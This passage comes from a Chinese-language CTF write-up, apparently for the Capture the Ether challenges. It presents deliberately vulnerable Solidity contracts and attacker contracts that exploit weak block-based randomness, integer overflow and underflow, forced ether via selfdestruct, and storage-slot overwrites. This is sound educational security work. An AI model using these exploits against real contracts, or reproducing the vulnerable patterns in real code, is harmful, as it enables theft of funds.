ether);</span><br><span class="line"></span><br><span class="line">        if (n == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题中的answer在构造函数中进行了初始化，所以根据solidity的存储结构，变量answer的值被存储在slot0中，此时的answer作为状态变量存储在storage中，所以可以使用web3js在微storage中读取</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">web3.js.getStorageAt(<span class="string">&quot;contract Address&quot;</span>, <span class="number">0</span>, <span class="built_in">console</span>.log)</span><br></pre></td></tr></table></figure><h3 id="Guess-the-new-number"><a href="#Guess-the-new-number" class="headerlink" title="Guess the new number"></a>Guess the new number</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract GuessTheNewNumberChallenge &#123;</span><br><span class="line">    function GuessTheNewNumberChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function guess(uint8 n) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line"></span><br><span class="line">        if (n == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attacker &#123;</span><br><span class="line">    function attack() public payable &#123;</span><br><span class="line">        uint8 result = uint8(keccak256(block.blockhash(block.number - 1), now));</span><br><span class="line">        GuessTheNewNumberChallenge target = GuessTheNewNumberChallenge(0x4779f53F8141Ab6Aa7414CAB3A2184Cc4c32C56A);</span><br><span class="line">        target.guess.value(1 ether)(result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function () public payable &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题需要获取到前一个区块的hash与当前的时间戳，由于每个区块包含很多个交易，而同一个区块的交易的前一个区块hash与时间戳都是相等的，所以可以通过部署另一个合约，从该合约调用目标合约中的guess函数使这俩个交易在一个块内。</p><h3 id="predict-the-future"><a href="#predict-the-future" class="headerlink" title="predict the future"></a>predict the future</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheFutureChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    uint8 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheFutureChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(uint8 n) public payable &#123;</span><br><span class="line">        require(guesser == 0);</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = n;</span><br><span class="line">        settlementBlockNumber = block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line">        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line">        guesser = 0;</span><br><span class="line">        if (guess == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题生成随机数的方式与上一题相同，不同点在于需要在<code>lockInGuess</code>函数处输入guess的值，然后<code>settlementBlockNumber</code>函数限制了在<code>settle()</code>函数中生成hash的块必须在<code>lockInGuess</code>块之后，所以无法直接调用<code>settle()</code>函数，由于最后获取hash值的方法为模10运算，因此answer的范围是0-9，因此可以利用爆破的方法来解决这道题。</p><p>思路：</p><ul><li>由于题目中锁定用户用的是<code>msg.sender</code>,所以需要部署一个攻击合约来随便猜一个数字，首先在攻击合约中调用<code>lockInGuess</code>函数，将猜的数字作为该函数的参数发送。</li><li>调用攻击合约中的爆破函数计算hash值与上一步猜的数字是否相等，当此块的信息得到的answer与我们猜的guess相同时我们再调用settle函数，以免guesser被清零。</li></ul><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">contract attacker &#123;</span><br><span class="line">    PredictTheFutureChallenge target;</span><br><span class="line">    uint public result;</span><br><span class="line">    function attacker() public payable &#123;</span><br><span class="line">        target = PredictTheFutureChallenge(0x1B67a75C3A4754d2586697722C36f181B7b82f5d);</span><br><span class="line">        target.lockInGuess.value(1 ether)(8);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function exploit() public payable &#123;</span><br><span class="line">        result = uint8(keccak256(block.blockhash(block.number - 1), now)) % 10;</span><br><span class="line">            if (result == 8) &#123;</span><br><span class="line">            target.settle();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function () public payable &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Predict-the-block-hash"><a href="#Predict-the-block-hash" class="headerlink" title="Predict the block hash"></a>Predict the block hash</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheBlockHashChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    bytes32 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheBlockHashChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(bytes32 hash) public payable &#123;</span><br><span class="line">        require(guesser == 0);</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = hash;</span><br><span class="line">        settlementBlockNumber = block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line">        bytes32 answer = block.blockhash(settlementBlockNumber);</span><br><span class="line">        guesser = 0;</span><br><span class="line">        if (guess == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题与上一题基本类似，不一样的地方在于需要猜当前块的 hash，但是对于<code>block.blockhash</code>这个函数，可以获取给定区块号的 <strong>hash</strong> 值，但只支持最近的 256 个区块，对于 256 个区块之外的区块，<code>block.blockhash</code>函数都将返回 0，所以可以先传递 <code>guess</code>为 0，然后等待 256 个区块再调用<code>settle</code>函数即可，具体代码如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract PredictTheBlockHashChallenge &#123;</span><br><span class="line">    address guesser;</span><br><span class="line">    bytes32 guess;</span><br><span class="line">    uint256 settlementBlockNumber;</span><br><span class="line"></span><br><span class="line">    function PredictTheBlockHashChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function lockInGuess(bytes32 hash) public payable &#123;</span><br><span class="line">        require(guesser == 0);</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        guesser = msg.sender;</span><br><span class="line">        guess = hash;</span><br><span class="line">        settlementBlockNumber = block.number + 1;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function settle() public &#123;</span><br><span class="line">        require(msg.sender == guesser);</span><br><span class="line">        require(block.number &gt; settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        bytes32 answer = block.blockhash(settlementBlockNumber);</span><br><span class="line"></span><br><span class="line">        guesser = 0;</span><br><span class="line">        if (guess == answer) &#123;</span><br><span class="line">            msg.sender.transfer(2 ether);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract attacker &#123;</span><br><span class="line"></span><br><span class="line">    PredictTheBlockHashChallenge target;</span><br><span class="line">    uint public result;</span><br><span class="line">    uint public num;</span><br><span class="line">    function attacker() public payable &#123;</span><br><span class="line">        target = PredictTheBlockHashChallenge(0xCF221473d9F6Ae7b95D47710776f5e7733C745F3);</span><br><span class="line">        target.lockInGuess.value(1 ether)(0);</span><br><span class="line">        num = block.number</span><br><span class="line">    &#125;</span><br><span class="line">    function exploit() public payable &#123;</span><br><span class="line">    if(block.number - num &gt; 256) &#123;</span><br><span class="line">            target.settle();</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    function () public payable &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id=""><a href="#" class="headerlink" title=""></a></h3><h3 id="Token-Sale"><a href="#Token-Sale" class="headerlink" title="Token Sale"></a>Token Sale</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenSaleChallenge &#123;</span><br><span class="line">//题目中定义了一个虚拟代币，通过mapping来追踪地址的代币数额</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    uint256 constant PRICE_PER_TOKEN = 1 ether;</span><br><span class="line">//和合约同名的构造函数，要求合约的初始余额为1 ether，</span><br><span class="line">    function TokenSaleChallenge(address _player) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">    &#125;</span><br><span class="line">//判断完成的条件要求合约中的余额小于 1 ether</span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance &lt; 1 ether;</span><br><span class="line">    &#125;</span><br><span class="line">//定义了买入token的方法，买入后更新mapping</span><br><span class="line">    function buy(uint256 numTokens) public payable &#123;</span><br><span class="line">        require(msg.value == numTokens * PRICE_PER_TOKEN);</span><br><span class="line">        balanceOf[msg.sender] += numTokens;</span><br><span class="line">    &#125;</span><br><span class="line">//定义了卖出token的方法</span><br><span class="line">    function sell(uint256 numTokens) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= numTokens);</span><br><span class="line">        balanceOf[msg.sender] -= numTokens;</span><br><span class="line">        msg.sender.transfer(numTokens * PRICE_PER_TOKEN);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先分析题目，题目中定义了一个虚拟代币，通过mapping来追踪地址的代币数额，<code>TokenSaleChallenge</code> 是和合约同名的构造函数，要求合约的初始余额为1 ether，当合约中的余额小于1 ether时完成题目。</p><p>由于买入多少币才能卖出多少币，所以如果想要能转出的买入的更多，就要求在买入的时候上溢，恰好这个合约没有safemath，存在溢出漏洞。</p><p>当买入的 token 小于 卖出的token 时可以利用溢出漏洞达到完成条件。</p><p>在<code>buy</code>函数中的的 判断<code>require(msg.value == numTokens * PRICE_PER_TOKEN);</code>，造成溢出需要当<code>msg.value</code>足够小，<code>numTokens</code>足够大，而 <code>PRICE_PER_TOKEN ==1 ether=10^18 wei</code>，所以当<code>numTokens * 10^18 &gt;= 2^256</code>时会上溢出</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// msg.value == numTokens * PRICE_PER_TOKEN</span><br><span class="line">计算刚好造成上溢出的 numToken</span><br><span class="line">//这里不加1的话计算出来的msg.value会非常大无法发送（115792089237316195423570985008687907853269984665640564039457000000000000000000）</span><br><span class="line">numTokens = 2^256/(10^18) + 1 = 115792089237316195423570985008687907853269984665640564039458</span><br><span class="line">msg.value = numTokens * 10^18 % (2^256) = 415992086870360064 wei</span><br></pre></td></tr></table></figure><p>因为需要以<code>wei</code>为单位发送 ether，所以需要在 Remix 中部署合约，调用<code>buy</code> 函数相当于以较小的<code>msg.value</code>获取到了大量的<code>token</code>,而这些<code>token</code>可以在<code>sell</code>函数中能够以 1 ether 的兑换率被转出， 就相当于以 0.4 ether 充值了相当于 1 ther 的<code>token</code>最后将这些<code>token</code>卖出，合约中的余额就会减少 1 ether，就达成了完成的条件。</p><h3 id="Token-whale"><a href="#Token-whale" class="headerlink" title="Token whale"></a>Token whale</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract TokenWhaleChallenge &#123;</span><br><span class="line">    address player;</span><br><span class="line"></span><br><span class="line">    uint256 public totalSupply;</span><br><span class="line">    mapping(address =&gt; uint256) public balanceOf;</span><br><span class="line">    mapping(address =&gt; mapping(address =&gt; uint256)) public allowance;</span><br><span class="line"></span><br><span class="line">    string public name = &quot;Simple ERC20 Token&quot;;</span><br><span class="line">    string public symbol = &quot;SET&quot;;</span><br><span class="line">    uint8 public decimals = 18;</span><br><span class="line"></span><br><span class="line">    function TokenWhaleChallenge(address _player) public &#123;</span><br><span class="line">        player = _player;</span><br><span class="line">        totalSupply = 1000;</span><br><span class="line">        balanceOf[player] = 1000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return balanceOf[player] &gt;= 1000000;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Transfer(address indexed from, address indexed to, uint256 value);</span><br><span class="line"></span><br><span class="line">    function _transfer(address to, uint256 value) internal &#123;</span><br><span class="line">        balanceOf[msg.sender] -= value; //利用此处的溢出</span><br><span class="line">        balanceOf[to] += value;</span><br><span class="line"></span><br><span class="line">        emit Transfer(msg.sender, to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transfer(address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[msg.sender] &gt;= value);</span><br><span class="line">        require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line"></span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    event Approval(address indexed owner, address indexed spender, uint256 value);</span><br><span class="line"></span><br><span class="line">    function approve(address spender, uint256 value) public &#123;</span><br><span class="line">        allowance[msg.sender][spender] = value;</span><br><span class="line">        emit Approval(msg.sender, spender, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function transferFrom(address from, address to, uint256 value) public &#123;</span><br><span class="line">        require(balanceOf[from] &gt;= value);</span><br><span class="line">        require(balanceOf[to] + value &gt;= balanceOf[to]);</span><br><span class="line">        require(allowance[from][msg.sender] &gt;= value);</span><br><span class="line"></span><br><span class="line">        allowance[from][msg.sender] -= value;</span><br><span class="line">        _transfer(to, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目中的代码是一个标准的 ERC20 标准代码 SET，当 player 即 msg.sender 的余额大于1000000 时完成题目，则需要<code>balanceof[msg.sender]</code>溢出。</p><p>观察主要存在以下几处风险：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">balanceOf[msg.sender] -= value; //27行可能存在下溢出，并且会更新msg.sender余额</span><br><span class="line">balanceOf[to] += value;//28行可能存在上溢出</span><br><span class="line">balanceOf[to] + value &gt;= balanceOf[to] //35行可能存在上溢出</span><br><span class="line">balanceOf[to] + value &gt;= balanceOf[to] //49行可能存在上溢出</span><br><span class="line">allowance[from][msg.sender] -= value;  //52行可能存在下溢出</span><br></pre></td></tr></table></figure><p>所以考虑实际可用的就是27行的下溢出：</p><ul><li><code>transfer()</code>函数调用了<code>_transfer()</code>函数，且存在溢出检查</li><li><code>transferFrom()</code>函数调用了<code>_transfer()</code>函数，不存在溢出检查，调用该函数需要调用<code>approve</code>函数批准转账额度</li></ul><p>逆向思考整个过程：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">要实现 27 行代码中 balanceOf[msg.sender] -= value; 这要求 msg.sender 的 mapping 里面的余额 &lt; value；</span><br><span class="line">_transfer函数应该调用msg.sender._transfer(to,value)，to为可控的account，value应该大于msg.sender的余额</span><br><span class="line">所以要先调用 msg.sender.transferFrom(to,any address,value)。第二个参数没有影响，相当于给这个地址增加token</span><br><span class="line">要求调用to.approve(msg.sender, value)</span><br></pre></td></tr></table></figure><p>所以这道题的解题流程是：</p><ol><li><p>引入一个可控的地址 <strong>to</strong> （需要用该地址发起交易）；</p></li><li><p>调用<code>transfer</code>函数给地址 <strong>to</strong> 转入一些 token，导致 player 的<code>token &lt; value</code>，且<code>value &lt; totalsupply</code>，当 player 的<code>token &lt; value</code>时可以造成下溢出；</p><p><img src="/image/capturetheether.assets/image-20220324164724573.png" alt="image-20220324164724573"></p><p>此时的<code>balanceOf[to]=800,balanceOf[msg.sender]=200</code></p></li><li><p>调用函数<code>to.approve(msg.sender, 800</code>);</p><p><img src="/image/capturetheether.assets/image-20220324163947646.png" alt="image-20220324163947646"></p><p>此时<code>allowance[to][msg.sender]=800</code></p></li><li><p>调用函数<code>msg.sender.transferFrom(to, this, 500);  </code>//选择当前合约地址作为接受 token 的地址</p><p><img src="/image/capturetheether.assets/image-20220324164309172.png" alt="image-20220324164309172"></p><p>在这里<code>address from = address to</code>，调用该函数时只比较了<code>balanceof[to] &gt; value</code>，且<code>allowance[to][msg.sender]=800 &gt; 500</code> 通过验证</p></li><li><p>执行代码<code>msg.sender._transfer(this, 500)</code>;</p></li><li><p>执行代码<code>balanceOf[msg.sender]-=500</code>造成下溢;</p></li><li><p>最终结果</p><p><img src="/image/capturetheether.assets/image-20220324164424093.png" alt="image-20220324164424093"></p></li></ol><h3 id="Retirement-fund"><a href="#Retirement-fund" class="headerlink" title="Retirement fund"></a>Retirement fund</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract RetirementFundChallenge &#123;</span><br><span class="line">    uint256 startBalance;</span><br><span class="line">    address owner = msg.sender;</span><br><span class="line">    address beneficiary;</span><br><span class="line">    uint256 expiration = now + 10 years;</span><br><span class="line"></span><br><span class="line">    function RetirementFundChallenge(address player) public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line"></span><br><span class="line">        beneficiary = player;</span><br><span class="line">        startBalance = msg.value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line"></span><br><span class="line">        if (now &lt; expiration) &#123;</span><br><span class="line">            // early withdrawal incurs a 10% penalty</span><br><span class="line">            msg.sender.transfer(address(this).balance * 9 / 10);</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            msg.sender.transfer(address(this).balance);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function collectPenalty() public &#123;</span><br><span class="line">        require(msg.sender == beneficiary);</span><br><span class="line">//startBalance = 1 ether,address(this).balance = 1 ether ,withdrawn = 0</span><br><span class="line">        uint256 withdrawn = startBalance - address(this).balance;</span><br><span class="line"></span><br><span class="line">        // an early withdrawal occurred</span><br><span class="line">        require(withdrawn &gt; 0);</span><br><span class="line"></span><br><span class="line">        // penalty is what&#x27;s left</span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当合约地址的余额为0时挑战成功，所以需要找到一个方法从合约中向外转钱。</p><p>该合约中存在一个转账方法<code>&lt;address&gt;.transfer(uint256 amount)</code>，转账的单位为 wei，转账的同时传输 2300 的gas且gas数量不可调整，该合约只有俩个函数会调用<code>transfer</code>方法：<code>withdraw 和 collectPenalty</code>函数，而在<code>withdraw()</code>函数中要求<code>require(msg.sender == owner);</code>，此时的 owner 是Capture the Ether factory contract，所以我们无法通过<code>require</code>判断，只能调用<code>collectPenalty</code>函数中的 <code>thransfer</code> 方法。</p><p>所以整个流程为：</p><ol><li>调用<code>collectPenalty</code>函数，通过判断<code>require(msg.sender == beneficiary)</code>;</li><li>执行<code>withdrawn = startBalance - address(this).balance;</code></li><li>判断 <code>withdrawn &gt;0</code>;</li><li>执行<code>msg.sender.transfer(address(this).balance);</code></li></ol><p>在第二部中由于<code>startBalance = 1 ether,address(this).balance = 1 ether ,withdrawn = 0</code>,无法使<code>withdrawn &gt;0</code>,所以可以通过部署一个合约，使用 <strong>selfdestruct</strong> 方法将该合约中的钱转入<code>RetirementFundChallenge</code>合约，当转入钱以后,<code>starttBalance = 1, address(this).balance &gt; 1</code>，此时就会造成下溢出，使其通过<code>withdrawn &gt; 0</code>的判断，最后使用  <code>thransfer</code> 方法将合约中的钱全部转出。</p><p>攻击合约：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.7.3;</span><br><span class="line">contract Attack &#123;</span><br><span class="line">constructor(address payable target) payable &#123;</span><br><span class="line">require(msg.value &gt; 0);</span><br><span class="line">selfdestruct(target);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Mapping"><a href="#Mapping" class="headerlink" title="Mapping"></a>Mapping</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract MappingChallenge &#123;</span><br><span class="line">    bool public isComplete;</span><br><span class="line">    uint256[] map;</span><br><span class="line"></span><br><span class="line">    function set(uint256 key, uint256 value) public &#123;</span><br><span class="line">        // Expand dynamic array as needed</span><br><span class="line">        if (map.length &lt;= key) &#123;</span><br><span class="line">            map.length = key + 1;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        map[key] = value;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function get(uint256 key) public view returns (uint256) &#123;</span><br><span class="line">        return map[key];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题目中判断是否完成的<code>isComplete</code>是一个布尔类型的变量，由于在该合约中没有改变其状态的函数，可以联想通过<code>storage</code>覆盖的方式，改变<code>isComplete</code>的值，只要写入数据就会变成 <strong>true。</strong></p><p>这个合约中只有俩个状态变量，而以太坊的 storage 中对于uint、mapping类型变量在不赋值的情况下会被初始化为 0，占用一个 slot（uint8 = uint256），对于struct对象，没有实例化的话不会占用slot，所以对于该合约这俩个变量的排列规则是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">---------------------------------------------------</span><br><span class="line">|          unused(31)          ｜  isComplete(1)  | &lt;- slot 0</span><br><span class="line">---------------------------------------------------</span><br><span class="line">|                 map.length                      | &lt;- slot 1</span><br><span class="line">---------------------------------------------------</span><br><span class="line">// ...</span><br><span class="line">slot keccak(1): map[0]</span><br><span class="line">slot keccak(1) + 1: map[1]</span><br><span class="line">slot keccak(1) + 2: map[2]</span><br><span class="line">slot keccak(1) + 3: map[3]</span><br><span class="line">slot keccak(1) + 4: map[4]</span><br><span class="line">// ...</span><br></pre></td></tr></table></figure><p>由存储结构可以联想到利用<code>map.length</code>的长度造成上溢，使<code>isComplete</code>变成true。即插槽 slot 1保存的是动态数组<code>map[]</code>的大小，该插槽的<code>keccak256</code>作为存储值的地址，如果可以以某种方式扩展该数组的边界使其覆盖掉<code>isComplete</code>的存储插槽，只要能找到写到哪个地址就可以访问并覆盖掉<code>isComplete</code>的值。</p><ol><li><p>计算需要访问哪个地址才能访问到<code>isComplete</code>，即访问到 slot 0；</p></li><li><p>计算<code>map[]</code>数组开始的地址，动态数组的第一个元素的位置计算公式为:<code>keccak256(bytes32(position))</code>,<code>map[]</code>数组的 position 为 slot 1，所以起始位置为<code>keccak256(bytes32(1))</code>，即<code>0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</code>;</p></li><li><p>由<code>map[]</code>数组中任意一个动态数组内的元素所在位置的计算公式为：<code>slot keccak(1) + map[index]</code>，所以要使 slot 的 key 值越界到 0 就可以控制 slot 1 的value，所以需要<code>keccak + index == 2^256</code>，所以 index 为：<code>35707666377435648211887908874984608119992236509074197713628505308453184860938</code>,即<code>map[]</code>数组在这个位置的变量会发生越界，且其值可以覆盖 map.length 的值。</p><p>计算方法：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span>**<span class="number">256</span> - <span class="built_in">int</span>(<span class="number">0xb10e2d527612073b26eecdfd717e6a320cf44b4afac2b0732d9fcbe2b7fa0cf6</span>)</span><br></pre></td></tr></table></figure></li><li><p>调用函数<code>set(key, value)</code>，key 为刚才计算的 index，value 为任意正数</p><p><img src="/image/capturetheether.assets/image-20220325170933550.png" alt="image-20220325170933550"></p></li></ol><h3 id="Donation"><a href="#Donation" class="headerlink" title="Donation"></a>Donation</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract DonationChallenge &#123;</span><br><span class="line">    struct Donation &#123;</span><br><span class="line">        uint256 timestamp;</span><br><span class="line">        uint256 etherAmount;</span><br><span class="line">    &#125;</span><br><span class="line">    Donation[] public donations;</span><br><span class="line"></span><br><span class="line">    address public owner;</span><br><span class="line"></span><br><span class="line">    function DonationChallenge() public payable &#123;</span><br><span class="line">        require(msg.value == 1 ether);</span><br><span class="line">        </span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    function isComplete() public view returns (bool) &#123;</span><br><span class="line">        return address(this).balance == 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function donate(uint256 etherAmount) public payable &#123;</span><br><span class="line">        // amount is in ether, but msg.value is in wei</span><br><span class="line">        uint256 scale = 10**18 * 1 ether;</span><br><span class="line">        require(msg.value == etherAmount / scale);</span><br><span class="line"></span><br><span class="line">        Donation donation;</span><br><span class="line">        donation.timestamp = now;</span><br><span class="line">        donation.etherAmount = etherAmount;</span><br><span class="line"></span><br><span class="line">        donations.push(donation);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    function withdraw() public &#123;</span><br><span class="line">        require(msg.sender == owner);</span><br><span class="line">        </span><br><span class="line">        msg.sender.transfer(address(this).balance);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这道题完成的条件是合约中的余额为 0 ，在构造函数中合约被转入了 1 ether，所以这道题就是要把这 1 ether 转出，只有在 <code>withdraw</code>函数中存在 <strong>transfer</strong> 方法，但是要求<code>msg.sender == owner</code>，目前 owner 在构造函数中被赋值，所以这道题的思路就是把 owner 的 slot 覆盖。</p><p>以太坊的 storage 中对于uint、mapping类型变量在不赋值的情况下会被初始化为 0，占用一个 slot（uint8 = uint256），对于struct对象，没有实例化的话不会占用slot，在这道题中，对结构体以及结构体数组均为赋初始值，所以存在未初始化的存储指针漏洞，storage 里的存储布局如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">-----------------------------------------------</span><br><span class="line">|              Donation.length                | &lt;- slot 0</span><br><span class="line">-----------------------------------------------</span><br><span class="line">|    unused(12   |        owner(20)           | &lt;- slot 1</span><br><span class="line">-----------------------------------------------</span><br><span class="line">|                 .............               | </span><br><span class="line">-----------------------------------------------</span><br></pre></td></tr></table></figure><p><code>timestamp</code>处传入的参数永远为 now ，只有<code>etherAmount</code>参数可控，由于是通过 push 给 动态数组<code>Donations</code>增加元素，所以无法将slot 地址上溢为 1。</p><p>这里需要利用 solidity 低版本特性，**<font color=red>struct 不赋值不会默认初始化，即结构体不赋值不会占用slot，由于结构体在函数内非显示地初始化时会使用storage存储而不是memory，所以可以达到变量覆盖的效果。</font>**</p><p>参考：<a href="http://www.freebuf.com/articles/blockchain-articles/175237.html">Solidity中存储方式错误使用所导致的变量覆盖</a></p><p>所以当<code>timestamp和etherAmount</code>在函数中初始化时会覆盖掉 slot 0 和 slot 1，如果让<code>etherAmount</code>传入自己的地址，就可以覆盖 owner，通过<code>require(msg.sender == owner);</code>检查。这里需要计算<code>msg.value</code>，因为<code>msg.value == etherAmount / scale ，scale = 10**18</code>，所以传入的 <code>value = etherAmount / 10**18/10**18</code>，然后调用<code>donate()</code>函数。</p><h3 id="Fifty-years"><a href="#Fifty-years" class="headerlink" title="Fifty years"></a>Fifty years</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pragma solidity ^0.4.21;</span><br><span class="line"></span><br><span class="line">contract FiftyYearsChallenge &#123;</span><br><span class="line">    struct Contribution &#123;</span><br><span class="line">        uint256 amount;</span><br><span class="line">        uint256 unlockTimestamp;</span><br><span class="line">    &#125;</span><br><span class="line">    Contribution[] queue;</span><br><span class="line">    uint256 head;</span><br><span class="line"></span><br><span class="line">  